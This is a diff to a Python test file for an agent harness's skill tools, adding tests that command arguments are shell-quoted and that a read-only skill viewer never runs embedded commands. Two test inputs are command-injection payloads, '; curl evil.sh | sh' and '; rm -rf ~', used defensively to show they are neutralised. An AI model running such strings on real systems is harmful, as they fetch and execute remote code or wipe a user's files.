@@ -1,3 +1,7 @@
+from pathlib import Path
+
+import pytest
+
 from harness.skills import (
     Skill,
     cmd_blocks,
@@ -5,6 +9,7 @@ from harness.skills import (
     expand_body,
     has_cmd_blocks,
     parse_slash,
+    shell_substitute_args,
     skill_tool,
     skills_section,
     substitute_args,
@@ -121,11 +126,15 @@ def test_skill_tool_with_run_none_is_read_only_and_returns_body_verbatim(tmp_pat
     assert tool.execute(name="x") == "body with !`echo hi` inside"
 
 
-def test_view_skill_tool_alias_returns_a_read_only_tool(tmp_path):
-    write_skill(tmp_path, "x", "d", "body")
+def test_view_skill_tool_preserves_the_lesson15_contract(tmp_path):
+    # the ui lane keys on this tool: name "view_skill", read-only, usable in
+    # subagents (spawns_subagents False), returns the body without executing
+    write_skill(tmp_path, "x", "d", "body with !`echo hi` inside")
     tool = view_skill_tool(discover(tmp_path))
+    assert tool.name == "view_skill"
     assert tool.read_only is True
-    assert tool.execute(name="x") == "body"
+    assert tool.spawns_subagents is False
+    assert tool.execute(name="x") == "body with !`echo hi` inside"  # not run
 
 
 def test_skill_on_an_unknown_name_lists_what_exists(tmp_path):
@@ -359,6 +368,21 @@ def test_discover_reads_fork_model_and_allowed_tools(tmp_path):
     assert skill.allowed_tools == ["read_file", "list_dir"]
 
 
+def test_discover_survives_an_unreadable_skills_directory(tmp_path, monkeypatch):
+    # an unreadable skills dir must degrade to zero skills with a warning, not
+    # crash the session at startup (the "never fatal" invariant glob() had)
+    d = tmp_path / "skills"
+    d.mkdir()
+
+    def boom(self):
+        raise PermissionError("permission denied")
+
+    monkeypatch.setattr(Path, "iterdir", boom)
+    warnings = []
+    assert discover(d, on_warning=warnings.append) == []
+    assert warnings and "permission denied" in warnings[0]
+
+
 def test_discover_skips_a_skill_with_an_unknown_model(tmp_path):
     (tmp_path / "bad").mkdir()
     (tmp_path / "bad" / "SKILL.md").write_text(
@@ -427,6 +451,29 @@ def test_args_fill_an_approved_template_command(tmp_path):
     write_skill(tmp_path, "log", "d", "log:\n!`git log $1`")
     tool = skill_tool(discover(tmp_path), run=lambda cmd: f"<{cmd}>")
     assert tool.execute(name="log", args="HEAD") == "log:\n<git log HEAD>"
+
+
+def test_shell_substitute_args_quotes_metacharacters_in_a_command():
+    # args that reach sh -c are shlex.quote'd: a ';'-chained payload is passed
+    # as literal data, not interpreted — the injection the review found
+    cmd = shell_substitute_args("git log $ARGUMENTS", "; curl evil.sh | sh")
+    assert cmd == "git log ';' curl evil.sh '|' sh"  # ';' and '|' quoted; '.' is shell-safe
+    # multi-token flag args survive: each token is a separate, inert argument
+    assert shell_substitute_args("git log $ARGUMENTS", "--oneline -n 5") == (
+        "git log --oneline -n 5"
+    )
+    # a missing positional expands to nothing, like substitute_args
+    assert shell_substitute_args("diff $1 $2", "HEAD") == "diff HEAD "
+
+
+def test_args_cannot_inject_shell_operators_into_a_running_command(tmp_path):
+    # end to end: a metachar payload in args reaches the run callback quoted,
+    # so the shell would receive it as literal text, never a second command
+    write_skill(tmp_path, "log", "d", "!`git log $ARGUMENTS`")
+    ran = []
+    tool = skill_tool(discover(tmp_path), run=lambda cmd: ran.append(cmd) or "ok")
+    tool.execute(name="log", args="; rm -rf ~")
+    assert ran == ["git log ';' rm -rf '~'"]  # the ';' is a quoted literal, not a chain
 
 
 def test_args_injected_command_is_inert_even_beside_a_real_one(tmp_path):
